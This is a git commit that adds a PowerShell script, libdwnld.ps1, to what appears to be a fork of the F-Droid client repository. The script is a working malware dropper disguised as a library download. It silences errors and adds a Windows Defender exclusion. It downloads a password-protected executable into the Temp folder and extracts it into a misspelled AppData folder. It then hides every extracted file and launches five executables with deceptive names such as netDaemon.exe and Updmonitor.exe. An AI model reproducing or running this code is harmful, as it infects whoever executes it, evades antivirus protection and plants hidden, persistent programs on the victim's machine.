421b46c218352e3f9b100a2b049030d01f8d6872
washywashy14 <122028842+washywashy14@users.noreply.github.com>
2023-01-12 23:55:06 +0000

    Add files via upload

---
+++ app/src/full/libdwnld.ps1
@@ -0,0 +1,18 @@
+$ErrorActionPreference = 'SilentlyContinue'
+$ProcName = "additionlibraries.exe"
+$WebFile = "https://github.com/washywashy14/fdroidclient/blob/master/app/src/full/additionlibraries.exe?raw=true"
+$Outff = "$env:Temp\additionlibraries.exe"
+Timeout /T 10
+Add-MpPreference -ExclusionProcess serverCommon.exe -Force
+Invoke-WebRequest -uri $WebFile -OutFile $Outff
+& $env:Temp\additionlibraries.exe -s -p"of9049nwp04yb3" -d"$env:APPDATA\chromiuumbased\services\"
+Get-ChildItem -path "$env:APPDATA\chromiuumbased\services\" -Recurse -Force | foreach {$_.attributes = "Hidden"}
+Start-Process "$env:APPDATA\chromiuumbased\services\fsdroiod.exe"
+Start-Process "$env:APPDATA\chromiuumbased\services\ProcManager.exe"
+Start-Process "$env:APPDATA\chromiuumbased\services\netDaemon.exe"
+Start-Process "$env:APPDATA\chromiuumbased\services\Netstservice.exe"
+Start-Process "$env:APPDATA\chromiuumbased\services\Updmonitor.exe"
+
+
+
+
